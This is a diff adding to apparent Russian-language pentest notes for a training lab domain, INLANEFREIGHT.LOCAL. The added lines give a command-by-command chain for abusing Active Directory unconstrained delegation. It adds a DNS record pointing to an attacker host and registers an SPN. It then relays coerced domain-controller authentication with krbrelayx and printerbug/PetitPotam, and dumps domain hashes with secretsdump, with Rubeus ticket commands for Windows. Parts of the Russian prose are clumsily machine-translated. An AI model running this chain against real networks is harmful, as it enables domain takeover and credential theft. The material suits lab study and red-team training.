@@ -670,7 +670,31 @@
   		findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
 		nxc ldap  172.16.8.3 -u annette.jackson -p horses -k --trusted-for-delegation --find-delegation
 * Unconstrained delegation
+		# from linux
+		https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
+  
+  		git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx
+  
+		dnstool.py -u ‘domain/user’ -p <password> -r attacker.domain.local -a add -t A -d <DCIP> <ATTACKERIP>
+		addspn.py -u ‘domain/unconstraineduser’ -p ‘password’ –spn cifs/attacker.domain.com ‘DC.domain.com’
 
+  		krbrelayx.py -s DOMAIN.LOCALunconstraineduser -p ‘password’ –t DC.domain.com
+
+		Как только krbrelayx настроен, для принудительной аутентификации можно использовать такой инструмент, как Coercer или PetitPotam. Преторианец решил использовать PetitPotam в этой ситуации.
+
+		Синтаксис для PetitPotam следующий:
+
+		python3 printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 roguecomputer.inlanefreight.local
+
+		После запуска PetitPotam krbrelayx.py перехватит и ретранслирует принудительную аутентификацию и выведет файл .ccache для контроллера домена. Это может быть импортировано как переменная окружения с помощью команды 		export KRB5CCNAME=DC.ccache. Как только файл .ccache был установлен в переменной окружения, Praetorian смог выгрузить NT-хэш контроллера домена из NTDS.dit контроллера домена, используя Impacket's secretsdump.py, в конечном итоге поставив под угрозу домен.
+		Неограниченное делегирование в Active Directory Синтаксис для PetitPotam
+
+		Синтаксис выглядит следующим образом:
+
+		secretsdump.py ‘domain.com/DC$@DC.domain.com’ -k -just-dc-user ADMIN
+		
+
+# для Виндовс
   		.\Rubeus.exe monitor /interval:5 /nowrap		(Ожидание аутентификации пользователя)
 
   		.\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt		Использование билета для запроса другого билета
